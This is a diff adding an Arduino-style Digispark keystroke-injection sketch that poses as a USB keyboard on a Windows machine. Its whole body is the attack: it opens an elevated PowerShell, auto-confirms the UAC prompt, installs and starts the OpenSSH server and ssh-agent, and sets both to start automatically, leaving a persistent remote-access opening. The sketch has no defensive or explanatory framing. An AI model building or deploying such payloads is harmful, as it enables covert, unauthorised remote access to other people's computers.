@@ -1,0 +1,34 @@
+DigiKeyboard.sendKeyStroke(0);
+//install win10sshserver script?
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
+DigiKeyboard.delay(300);
+DigiKeyboard.print(F("powershell Start-Process powershell -Verb runAs"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
+DigiKeyboard.delay(300);
+DigiKeyboard.print(F("Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.2.0"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300);
+DigiKeyboard.print(F("Install-Module -Force OpenSSHUtils -Scope AllUsers"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print(F("y"));
+DigiKeyboard.delay(300);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300);
+DigiKeyboard.print(F("Set-Service sshd -StartupType Automatic"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300);
+DigiKeyboard.print(F("Set-Service ssh-agent -StartupType Automatic"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300);
+DigiKeyboard.print(F("Start-Service ssh-agent"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300);
+DigiKeyboard.print(F("Start-Service sshd"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300);
+DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_W);
+for(;;){ /*empty*/ }
